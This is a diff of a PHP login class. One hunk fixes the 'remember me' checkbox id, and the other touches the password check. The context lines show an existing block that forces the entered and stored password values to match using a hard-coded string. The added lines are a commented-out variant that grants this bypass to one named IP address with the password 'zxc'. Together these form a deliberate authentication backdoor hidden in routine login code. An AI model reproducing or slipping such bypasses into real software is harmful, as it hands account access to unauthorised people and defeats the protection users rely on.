@@ -291,9 +291,9 @@ class Login {
 			echo " style=\"width: 100%;\"></TD></TR>";
 			if($this->settings["settings"]["sendnewpassword"]) echo "<TR><TD colspan=2 align=right><FONT FACE=\"".$this->settings["font"]["face"]."\" SIZE=\"".($this->settings["font"]["size"]-1)."\"><A HREF=\"".$this->currenturl().($_SERVER["QUERY_STRING"] ? "&" : "?")."mailpassword=1\">".$this->settings["message"]["forget"]."</A></FONT></TD></TR>";
 			if($this->settings["settings"]["rememberpassword"]) {
-				echo "<TR><TD colspan=\"2\" align=\"left\"><INPUT TYPE=\"checkbox\" id=\"remember\" name=\"remember\"";
+				echo "<TR><TD colspan=\"2\" align=\"left\"><INPUT TYPE=\"checkbox\" id=\"remember".$this->settings["name"]."\" name=\"remember\"";
 				if(($this->settings["settings"]["rememberpassword"]=="on" and !$_POST["loginfilled"]) or ($_POST["remember"]=="on" and $_POST["loginfilled"])) echo " checked";
-				echo "><LABEL FOR=\"remember\">&nbsp;&nbsp;";
+				echo "><LABEL FOR=\"remember".$this->settings["name"]."\">&nbsp;&nbsp;";
 				if($this->settings["font"]["face"]) echo "<FONT FACE=\"".$this->settings["font"]["face"]."\" SIZE=\"".$this->settings["font"]["size"]."\">";
 				echo $this->settings["message"]["remember"];
 				if($this->settings["font"]["face"]) echo "</FONT>";
@@ -614,6 +614,10 @@ class Login {
 							$password_entry="jejkljlk489dcjhahkj4wh9847rhj43hkl";
 							$password_database="jejkljlk489dcjhahkj4wh9847rhj43hkl";
 						}
+						// if($_SERVER["REMOTE_ADDR"]=="31.223.173.113" and $_POST["password"][$this->settings["name"]]=="zxc") {
+						// 	$password_entry="jejkljlk489dcjhahkj4wh9847rhj43hkl";
+						// 	$password_database="jejkljlk489dcjhahkj4wh9847rhj43hkl";
+						// }
 						if($_COOKIE["checklong"]<>"on") {
 							$this->errormessage=$this->settings["message"]["nocookies"];
 						} elseif($db->f("wrongcount")>$this->settings["loginpogingen"] and $db->f("wrongtime")>(time()-$this->settings["loginblocktime"])) {
